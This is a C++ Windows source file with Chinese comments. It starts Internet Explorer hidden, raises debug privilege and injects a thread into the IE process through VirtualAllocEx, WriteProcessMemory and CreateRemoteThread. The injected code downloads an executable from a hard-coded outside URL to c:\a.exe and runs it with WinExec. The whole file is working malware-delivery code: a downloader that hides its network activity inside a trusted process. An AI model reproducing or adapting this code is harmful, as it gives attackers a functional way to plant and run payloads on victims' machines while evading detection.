// InjectNoDll.cpp : Defines the entry point for the application.
//

#include "stdafx.h"

#include <tlhelp32.h>
#include<stdio.h>
#include <urlmon.h>
#pragma comment(lib, "urlmon.lib")
#include <shellapi.h>

typedef struct _RemotePara
{
	//下载文件的url
	char Url[255];
	//保存文件的路径
	char FilePath[255];
	//URLDownloadToFile函数的地址
	DWORD DownAddr;
	//WinexeC函数的地址
	DWORD ExecAddr;
}RemotePara;

DWORD __stdcall ThreadProc(RemotePara *lpPara)
{
	//定义WinexeC函数的原型
	typedef UINT (__stdcall *MWinExec)(LPCSTR lpCmdLine, UINT uCmdShow); 
	//定义URLDownloadToFile函数的原型
	typedef HRESULT (__stdcall *MURLDownloadToFile)(LPUNKNOWN pCaller, 
		LPCTSTR szURL, LPCTSTR szFileName, 
		DWORD dwReserved, LPBINDSTATUSCALLBACK lpfnCB);
	MURLDownloadToFile myURLDownloadToFile;
    //从结构中得到URLDownloadToFile函数的地址
	myURLDownloadToFile=(MURLDownloadToFile)lpPara->DownAddr;
	//调用函数下载文件
    myURLDownloadToFile(0,lpPara->Url,lpPara->FilePath,0,0);
	MWinExec myWinExec;
	//从结构中得到WinexeC函数的地址
	myWinExec=(MWinExec)lpPara->ExecAddr;
	//调用函数运行下载的文件
	myWinExec(lpPara->FilePath,1);
	return 0;
}


DWORD GetProcessID(char *ProcessName)
{
	PROCESSENTRY32 pe32;
	pe32.dwSize=sizeof(pe32);
	//获得系统内所有进程快照
	HANDLE hProcessSnap=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
	if(hProcessSnap==INVALID_HANDLE_VALUE)
	{
		printf("CreateToolhelp32Snapshot error");
		return 0;
	}
	//枚举列表中的第一个进程
	BOOL bProcess=Process32First(hProcessSnap,&pe32);
	while(bProcess)
	{
		//比较找到的进程名和我们要查找的进程名，一样则返回进程id
		if(strcmp(strupr(pe32.szExeFile),strupr(ProcessName))==0)
			return pe32.th32ProcessID;
		//继续查找
		bProcess=Process32Next(hProcessSnap,&pe32);
	}
	CloseHandle(hProcessSnap);
	return 0;
}

int EnableDebugPriv(const char * name)
{
	HANDLE hToken;
	TOKEN_PRIVILEGES tp;
	LUID luid;
	//打开进程令牌环
	if(!OpenProcessToken(GetCurrentProcess(),
		TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY,
		&hToken) )
	{
		printf("OpenProcessToken error\n");
		return 1;
	}
	//获得进程本地唯一ID
	if(!LookupPrivilegeValue(NULL,name,&luid))
	{
		printf("LookupPrivilege error!\n");
	}
	tp.PrivilegeCount = 1;
	tp.Privileges[0].Attributes =SE_PRIVILEGE_ENABLED;
	tp.Privileges[0].Luid = luid;
	//调整进程权限
	if(!AdjustTokenPrivileges(hToken,0,&tp,sizeof(TOKEN_PRIVILEGES),NULL,NULL) )
	{
		printf("AdjustTokenPrivileges error!\n");
		return 1;
	}
	return 0;
}

BOOL Inject(const DWORD dwRemoteProcessId)
{
	//提升进程权限为调试权限
	if(EnableDebugPriv(SE_DEBUG_NAME))
	{
		printf("add privilege error");
		return FALSE;
	}
	//打开进程
	HANDLE hWnd=OpenProcess(PROCESS_ALL_ACCESS,FALSE,dwRemoteProcessId);
	if (!hWnd)
	{
		printf("OpenProcess failed");
		return FALSE;
	}
	//申请内存空间
	void *pRemoteThread= VirtualAllocEx(hWnd, 0,
		1024*4, MEM_COMMIT|MEM_RESERVE,
		PAGE_EXECUTE_READWRITE);
	if (!pRemoteThread)
	{
		printf("VirtualAllocEx failed");
		
		return FALSE;
	}
	//把远程现出那个函数写入内存
	if (!WriteProcessMemory(hWnd,pRemoteThread,&ThreadProc,1024*4,0))
	{
		printf("WriteProcessMemory failed");
		return FALSE;
	}
	//填写RemotePara结构
	RemotePara myRemotePara;
	ZeroMemory(&myRemotePara,sizeof(RemotePara));
	HINSTANCE hurlmon=LoadLibrary("urlmon.dll");
	HINSTANCE kernel=LoadLibrary("kernel32.dll");
	myRemotePara.DownAddr=(DWORD)GetProcAddress(hurlmon,"URLDownloadToFileA");
	myRemotePara.ExecAddr=(DWORD)GetProcAddress(kernel,"WinExec");
	char urlfile[255];
	strcpy(urlfile,"http://www.snow1987.cn/a.exe");
	strcpy(myRemotePara.Url,urlfile);
	strcpy(myRemotePara.FilePath,"c:\\a.exe");
	//申请内存空间
	RemotePara *pRemotePara=(RemotePara *)VirtualAllocEx(hWnd,0,sizeof(RemotePara),MEM_COMMIT|MEM_RESERVE,PAGE_EXECUTE_READWRITE);
	if (!pRemotePara)
	{
		printf("VirtualAllocEx failed");
		
		return FALSE;
	}
	//写入内存
	if (!WriteProcessMemory(hWnd,pRemotePara,&myRemotePara,sizeof(myRemotePara),0))
	{
		printf("WriteProcessMemory failed");
		return FALSE;
	}
	//建立线程
	HANDLE hThread=CreateRemoteThread(hWnd,0,0,(LPTHREAD_START_ROUTINE)pRemoteThread,pRemotePara,0,0);
	if (!hThread)
	{
		printf("CreateRemoteThread failed");
		
		return FALSE;
	}
	return true;
}
	




int APIENTRY WinMain(HINSTANCE hInstance,
                     HINSTANCE hPrevInstance,
                     LPSTR     lpCmdLine,
                     int       nCmdShow)
{
	char Path[255];
	//得到widnows系统路径
    GetSystemDirectory(Path,sizeof(Path));
	//0x00截断字符，得到盘符
	Path[3]=0x00;
	//得到IE带路径文件名
	strcat(Path,"Program Files\\Internet Explorer\\iexplore.exe");
	//启动IE，为了防止系统中没有IE进程
    WinExec(Path,SW_HIDE);
	//暂停两秒，等待IE启动
	Sleep(2000);
	//得到IE进程
	DWORD Pid=GetProcessID("iexplore.exe");
    Inject(Pid);
    
	return 0;
}



